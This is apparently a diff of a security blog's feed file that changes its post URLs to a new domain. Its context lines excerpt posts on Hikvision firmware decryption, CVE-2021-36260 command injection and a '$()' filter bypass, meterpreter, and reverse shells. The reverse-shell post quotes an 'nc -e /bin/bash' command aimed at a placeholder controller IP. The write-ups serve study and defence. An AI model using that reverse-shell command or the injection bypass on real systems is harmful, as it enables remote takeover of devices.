+&lt;p&gt;解密后的文件格式可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;(转载文章)Hik or hack? (NOT) IoT Security Using Hikvision IP Cameras&quot;，解密固件可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;HaToan&#x2F;Decrypt-Firmware-Hikvision&quot; 和 &quot;MatrixEditor&#x2F;hiktools&quot; 项目。当然，我也写了一个可以解密固件的脚本，比之前的脚本开源工具相比能解密更多的固件格式，也很容易对脚本进行扩展，地址&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;gadget&#x2F;blob&#x2F;master&#x2F;hik_firmware&#x2F;decrypt.py&quot;&gt;在这&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在 Refs 我还放了 hikpack 的下载链接，hikpack 可以解密 r0,r1,r6,g0 设备的固件。我本来想看下 hikpack 是怎么进行文件解密的，但是 hikpack 居然用了 OLLVM 混淆，有必要吗...&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
@@ -1743,7 +1743,7 @@
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
 &lt;p&gt;可以发现 s1 在 [bp-378h] 的位置，而 URL 的长度为 0x400，如果输入长度为 0x400 的 URL 就会导致栈溢出。理论上通过 ROP 即可达成利用。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CVE-2021-36260&quot;&gt;CVE-2021-36260&lt;&#x2F;h2&gt;
-&lt;p&gt;在 5.4.5 版本的固件中，出现漏洞的代码如下。可以看到程序使用了格式化字符串拼接命令，并且未对用户输入进行过滤，造成命令注入。具体的利用方法请参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;hikvision CVE-2021-36260 分析以及教训&quot;&lt;&#x2F;p&gt;
+&lt;p&gt;在 5.4.5 版本的固件中，出现漏洞的代码如下。可以看到程序使用了格式化字符串拼接命令，并且未对用户输入进行过滤，造成命令注入。具体的利用方法请参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;hikvision CVE-2021-36260 分析以及教训&quot;&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在 5.5 版本的固件中，海康加入了 &lt;code&gt;filter_quotation_and_punctuation_mark&lt;&#x2F;code&gt; 函数来过滤用户输入，但是还是可以通过 &quot;$()&quot; 进行绕过，直到漏洞爆出后加入了 &lt;code&gt;hwif_is_all_language_character_legal&lt;&#x2F;code&gt; 函数才完全修复。&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
@@ -1809,10 +1809,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/qemu/"/>
-        <id>https://chenx6.github.io/post/qemu/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/qemu/"/>
+        <id>https://chenx6.uk/post/qemu/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/qemu/">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/qemu/">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CPU_配置&quot;&gt;CPU 配置&lt;&#x2F;h2&gt;
 &lt;p&gt;下面的选项开启 KVM 全虚拟化支持，能提升虚拟机的速度。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;--enable-kvm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
@@ -1883,10 +1883,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/meterpreter/"/>
-        <id>https://chenx6.github.io/post/meterpreter/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/meterpreter/"/>
+        <id>https://chenx6.uk/post/meterpreter/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/meterpreter/">&lt;p&gt;meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向&#x2F;反向连接模式，并且功能强大，所以想分析下其实现。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/meterpreter/">&lt;p&gt;meterpreter 是 metasploit 里自带的一款远程控制工具，具有正向&#x2F;反向连接模式，并且功能强大，所以想分析下其实现。&lt;&#x2F;p&gt;
 &lt;ul&gt;
 &lt;li&gt;2022-10-23 初版博文发布&lt;&#x2F;li&gt;
 &lt;li&gt;2023-01-21 加入端口转发功能的实现分析&lt;&#x2F;li&gt;
@@ -2195,10 +2195,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/from_log/"/>
-        <id>https://chenx6.github.io/post/from_log/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/from_log/"/>
+        <id>https://chenx6.uk/post/from_log/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/from_log/">&lt;p&gt;2023-03-12 更新：添加了使用 &lt;code&gt;ida_hexrays.decompile&lt;&#x2F;code&gt; 的方法&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/from_log/">&lt;p&gt;2023-03-12 更新：添加了使用 &lt;code&gt;ida_hexrays.decompile&lt;&#x2F;code&gt; 的方法&lt;&#x2F;p&gt;
 &lt;p&gt;在逆向二进制程序中，经常碰到将程序 strip 了，但是日志函数中保留着函数名字的情况。所以写文记录在这种情况下，使用 IDAPython 恢复函数名字的过程。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;日志函数长什么样&quot;&gt;日志函数长什么样&lt;&#x2F;h2&gt;
 &lt;p&gt;下面是我手写的一个日志函数。主要有几个部分：&lt;&#x2F;p&gt;
@@ -2484,10 +2484,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/calculator/"/>
-        <id>https://chenx6.github.io/post/calculator/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/calculator/"/>
+        <id>https://chenx6.uk/post/calculator/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/calculator/">&lt;p&gt;”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/calculator/">&lt;p&gt;”想写个计算器“这件事情应该是我刚学会 C 语言时候的事情，当时还看不懂栈，逆波兰式等结构。但是现在不一样了，我不仅学过数据结构，还学过了编译原理。这次我就拿学过的编译原理相关知识写个计算器。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;前置知识&quot;&gt;前置知识&lt;&#x2F;h2&gt;
 &lt;p&gt;上下文无关语法(CFG)：描述了语句是如何形成的。&lt;&#x2F;p&gt;
 &lt;p&gt;语句：从语法规则里推导出的一个符号串。&lt;&#x2F;p&gt;
@@ -2802,10 +2802,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/compile_cheatsheet/"/>
-        <id>https://chenx6.github.io/post/compile_cheatsheet/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/compile_cheatsheet/"/>
+        <id>https://chenx6.uk/post/compile_cheatsheet/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/compile_cheatsheet/">&lt;p&gt;C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/compile_cheatsheet/">&lt;p&gt;C 和 C++ 的编译是真的痛苦，会出现一堆离谱的问题。所以我特地写一篇文章讲一下这些破事，并且提供一些样例代码方便复制黏贴。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;编译过程简述&quot;&gt;编译过程简述&lt;&#x2F;h2&gt;
 &lt;p&gt;在网上能找到一堆的编译流程相关的博客，而且肯定比我讲的正确，所以这里我就简单概括下。&lt;&#x2F;p&gt;
 &lt;p&gt;现在很少有程序能只依赖与 C 标准库和系统 API 了，所以会有一堆的外部依赖库。要想编译成功，得让编译器和链接器都知道去哪找这些库，怎么链接上。于是就有了一堆的编译管理工具。像 CMake 和 Meson 是负责生成编译的脚本，make 和 ninja 则是负责执行编译任务，然后是 gcc 和 clang 将代码编译成目标文件，最后有 ld, gold, mold 将目标文件进行链接生成可执行文件。&lt;&#x2F;p&gt;
@@ -2864,7 +2864,7 @@ $$&lt;&#x2F;p&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;meson&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; compile&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;C&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; builddir&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt; 跨平台编译&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;meson&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; setup&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;-cross-file&lt;&#x2F;span&gt;&lt;span&gt; $&lt;&#x2F;span&gt;&lt;span&gt;跨平台编译配置文件&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;.ini&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; builddir&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;更多的内容参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;更多的内容参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h3 id=&quot;CMake&quot;&gt;CMake&lt;&#x2F;h3&gt;
 &lt;p&gt;样例代码&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;cmake&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt;# 指定项目名字，CMake 版本要求，C++ 版本要求&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -2905,7 +2905,7 @@ $$&lt;&#x2F;p&gt;
 &lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
 &lt;p&gt;设置 pkg-config 搜索路径&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt;export&lt;&#x2F;span&gt;&lt;span&gt; PKG_CONFIG_PATH&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;usr&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;lib&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;pkgconfig&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;:&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span&gt;PKG_CONFIG_PATH&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;官方文档参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;官方文档参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;编译器&quot;&gt;编译器&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;GCC编译选项&quot;&gt;GCC编译选项&lt;&#x2F;h3&gt;
 &lt;h4 id=&quot;链接&quot;&gt;链接&lt;&#x2F;h4&gt;
@@ -2930,7 +2930,7 @@ $$&lt;&#x2F;p&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;zig&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; cc&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; hello.c&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; i386-linux-musl&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;static&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#90A4AE, #676E95);font-style: italic;&quot;&gt; 让 make 等工具使用&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;make&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; CC=&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;zig cc&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; CXX=&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;zig c++&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;参考文章 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;参考文章 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;compile_cheatsheet&#x2F;#refs&quot;&gt;#refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;Docker&#x2F;Podman&quot;&gt;Docker&#x2F;Podman&lt;&#x2F;h3&gt;
 &lt;p&gt;Ubuntu image，添加 32 位支持，安装编译工具链，库和 CMake&lt;&#x2F;p&gt;
@@ -2953,7 +2953,7 @@ $$&lt;&#x2F;p&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#F76D47, #F78C6C);&quot;&gt;RUN&lt;&#x2F;span&gt;&lt;span&gt; python3 -m pip install cmake meson ninja -i https:&#x2F;&#x2F;opentuna.cn&#x2F;pypi&#x2F;web&#x2F;simple&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
 &lt;p&gt;使用容器进行编译。设置成运行完后删除，并将当前目录映射到 &quot;&#x2F;src&quot; 目录下，启动名字为 &lt;code&gt;$容器名字&lt;&#x2F;code&gt; 的容器。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;podman&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; run&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;-rm&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;$(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;pwd&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;:&#x2F;src&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; -&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt;it&lt;&#x2F;span&gt;&lt;span&gt; $&lt;&#x2F;span&gt;&lt;span&gt;容器名字&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;Glibc_symver&quot;&gt;Glibc symver&lt;&#x2F;h3&gt;
-&lt;p&gt;有时候在新系统上编译的可执行文件，在旧系统上运行时，会产生 &quot;找不到函数&quot; 错误。这时候可以通过指定 symver 来进行兼容旧版本。具体细节可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;compile_cheatsheet&#x2F;#Refs&quot;&gt;#Refs&lt;&#x2F;a&gt; 中的 &quot;All about symbol versioning&quot;，或者使用 &quot;wheybags&#x2F;glibc_version_header&quot; 这个项目。&lt;&#x2F;p&gt;
+&lt;p&gt;有时候在新系统上编译的可执行文件，在旧系统上运行时，会产生 &quot;找不到函数&quot; 错误。这时候可以通过指定 symver 来进行兼容旧版本。具体细节可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;compile_cheatsheet&#x2F;#Refs&quot;&gt;#Refs&lt;&#x2F;a&gt; 中的 &quot;All about symbol versioning&quot;，或者使用 &quot;wheybags&#x2F;glibc_version_header&quot; 这个项目。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;c&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt;__asm__&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;.symver fopen,fopen@GLIBC_2.2.5&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;Refs&quot;&gt;Refs&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;gcc.gnu.org&#x2F;onlinedocs&#x2F;gcc-11.3.0&#x2F;gcc&#x2F;&quot;&gt;https:&#x2F;&#x2F;gcc.gnu.org&#x2F;onlinedocs&#x2F;gcc-11.3.0&#x2F;gcc&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
@@ -2980,10 +2980,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/rev_pty/"/>
-        <id>https://chenx6.github.io/post/rev_pty/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/rev_pty/"/>
+        <id>https://chenx6.uk/post/rev_pty/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/rev_pty/">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/rev_pty/">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;“可交互_Shell”_的原理&quot;&gt;“可交互 Shell” 的原理&lt;&#x2F;h2&gt;
 &lt;p&gt;现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &quot;pty&quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。&lt;&#x2F;p&gt;
 &lt;p&gt;而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。&lt;&#x2F;p&gt;
@@ -3129,10 +3129,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/plthook/"/>
-        <id>https://chenx6.github.io/post/plthook/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/plthook/"/>
+        <id>https://chenx6.uk/post/plthook/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/plthook/">&lt;p&gt;虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现...碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/plthook/">&lt;p&gt;虽然知道可以通过魔改 plt 表实现 hook 函数，但是不知道具体实现...碰巧最近用到了 plthook 这个库，于是我就研究了下 plthook 这个库，并且仿照着这个库重新实现一份代码。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;原理分析&quot;&gt;原理分析&lt;&#x2F;h2&gt;
 &lt;p&gt;根据命名规则，.rela.plt 表是负责 plt 表的重定位信息。.rela 表中有每项都有 2 个成员，r_offset 指向了该重定位入口所要修正的位置的第一个字节的虚拟地址， r_info 则是表示相关信息，可以通过 &lt;code&gt;ELF[32|64]_R_SYM&lt;&#x2F;code&gt; 获得其指向的 .dynsym 项的下标。&lt;&#x2F;p&gt;
 &lt;p&gt;.dynsym 表（动态链接表）中存放动态链接需要的信息，可以通过 .dynsym 表从 .strtab 表中获得要链接的函数名字。&lt;&#x2F;p&gt;
@@ -3246,10 +3246,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/frida_beginner/"/>
-        <id>https://chenx6.github.io/post/frida_beginner/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/frida_beginner/"/>
+        <id>https://chenx6.uk/post/frida_beginner/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/frida_beginner/">&lt;p&gt;在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/frida_beginner/">&lt;p&gt;在某次离谱比赛中，我使用了 Frida 解出了题目，下面是一些简单的笔记。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在 2021 年 10 月 24 日，我浪费了2小时的时间解出了一个某弹幕网站办的比赛的离谱安卓题，解出之后的内心就是：rnm，退时间！更加嘲讽的是，他还在一个月后转给了我 0.56 元作为奖励！&lt;&#x2F;p&gt;
 &lt;p&gt;那天比较欣慰的是在某弹幕网站上看完了 A·ZU·NA 的 FMT（&lt;&#x2F;p&gt;
@@ -3578,10 +3578,10 @@ $$&lt;&#x2F;p&gt;
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/fail_firm_fuzz/"/>
-        <id>https://chenx6.github.io/post/fail_firm_fuzz/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/fail_firm_fuzz/"/>
